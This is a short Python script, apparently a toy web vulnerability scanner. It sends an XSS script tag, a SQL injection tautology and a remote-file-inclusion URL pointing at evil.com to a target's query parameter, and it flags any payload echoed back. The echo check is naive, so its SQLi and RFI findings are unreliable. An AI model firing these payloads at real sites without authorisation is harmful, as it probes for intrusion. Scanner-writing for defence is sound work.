import requests

# Define the URL of the web application or website to scan
target_url = 'https://example.com'

# Define a list of common vulnerabilities to check
vulnerabilities = [
    ('Cross-Site Scripting (XSS)', '<script>alert("XSS")</script>'),
    ('SQL Injection', '1\' OR \'1\' = \'1'),
    ('Remote File Inclusion (RFI)', 'http://evil.com/malicious-file.txt'),
    # Add more vulnerabilities to check as needed
]

# Send a GET request to the target URL and check for vulnerabilities
response = requests.get(target_url)

for vulnerability, payload in vulnerabilities:
    # Create a new request with the payload
    modified_request = requests.Request('GET', target_url, params={'q': payload}).prepare()
    modified_response = requests.Session().send(modified_request)

    # Check if the vulnerability is present in the response
    if payload in modified_response.text:
        print(f'Vulnerability found: {vulnerability}')
